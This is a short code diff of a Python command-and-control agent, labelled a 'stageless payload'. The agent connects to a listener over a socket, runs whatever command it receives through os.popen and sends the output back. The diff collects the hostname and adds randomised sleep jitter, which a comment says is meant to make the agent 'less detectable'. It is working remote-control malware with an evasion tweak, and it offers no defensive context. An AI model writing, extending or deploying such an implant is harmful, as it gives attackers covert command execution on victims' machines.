@@ -1,11 +1,13 @@
 import socket
 import time
-import os
+import os, sys
+import random
+
+# Stageless Payload (contains full Agent)
 
 HOST, PORT = "localhost", 9999
-#data = " ".join(sys.argv[1:])
-data = os.popen('echo $($env:ComputerName)').read()
-
+command = "hostname"
+data = os.popen(command).read()
 Loop = True
 
 while(Loop):
@@ -25,5 +27,6 @@ while(Loop):
         c2command = os.popen(received).read()
         sock.sendall(bytes(c2command + "\n", "utf-8"))
 
-        time.sleep(5)
+        # Add jitter to make it less detectable
+        time.sleep(random.randint(1,5))
 
